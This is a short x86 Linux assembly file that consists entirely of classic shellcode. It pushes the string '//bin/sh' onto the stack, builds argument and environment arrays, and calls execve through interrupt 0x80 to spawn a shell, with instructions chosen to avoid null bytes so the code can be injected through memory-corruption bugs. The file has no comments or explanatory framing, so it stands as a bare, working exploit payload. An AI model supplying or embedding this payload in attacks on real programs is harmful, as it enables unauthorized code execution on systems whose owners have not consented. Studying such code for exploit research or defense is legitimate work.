.section .text
.globl _start
_start:
	xorl	%eax, %eax

	pushl	%eax
	pushl	$0x68732f6e
	pushl	$0x69622f2f
	movl	%esp, %ebx

	pushl	%eax
	pushl	%eax
	pushl	%ebx
	movl	%esp, %ecx

	leal	0x08(%esp), %edx

	movb	$0x0b, %al

	int	$0x80
